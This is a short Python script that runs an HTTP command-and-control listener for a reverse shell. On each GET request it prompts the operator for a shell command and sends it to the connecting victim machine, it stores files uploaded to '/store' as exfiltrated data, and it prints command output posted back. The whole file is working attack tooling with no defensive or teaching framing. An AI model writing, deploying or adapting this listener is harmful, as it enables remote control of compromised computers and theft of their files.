from http.server import BaseHTTPRequestHandler, HTTPServer
import os, cgi

HOST_NAME = input(str("Enter your IP address: "))
PORT_NUMBER = 80

class MyHandler(BaseHTTPRequestHandler): # This class will handle any incoming request from a browser
    def do_GET(s): # Handler for the GET requests
        command = input('~Shell: ')
        s.send_response(200)
        s.send_header("Content-type", "text/html")
        s.end_headers()
        s.wfile.write(command.encode("utf-8")) #write the command to the server

    def do_POST(s): # Handler for the POST requests
        if s.path == '/store':
            try:
                ctype, blabla = cgi.parse_header(s.headers.getheader('content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage (fp = s.rfile, headers = s.headers, environ={ 'REQUEST_METHOD':'POST' })
                else:
                    print ("[-] Unexpected Post Request")
                fs_up = fs['file']
                with open('1.txt', 'wb') as o:
                    o.write( fs_up.file.read() )
                    s.send_response(200)
                    s.end_headers()
            except Exception as e:
                print (e)
            return

        s.send_response(200)
        s.end_headers()
        length = int(s.headers['Content-Length'])
        postVar = s.rfile.read((length))
        print (postVar.decode('utf-8'))

if __name__ == '__main__':
# Create a web server and define the handler to manage the
# incoming request
    httpd = HTTPServer((HOST_NAME, PORT_NUMBER), MyHandler)
    try:
        httpd.serve_forever() # Wait forever for incoming http requests
    except KeyboardInterrupt:
        print ('[!] Server is terminate')
        httpd.server_close()
